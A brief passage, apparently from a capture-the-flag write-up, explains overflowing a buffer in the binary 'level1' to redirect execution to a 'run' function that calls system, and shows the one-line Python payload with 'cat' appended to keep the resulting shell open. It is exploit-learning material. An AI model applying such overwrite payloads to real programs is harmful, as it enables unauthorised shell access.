...
We see that in the list of functions, there is a ``run`` function.
...
In this function, we call the ``system`` function.
...
To keep the shell open, we append ``cat`` to the payload.

```
$ (python -c 'print "0" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
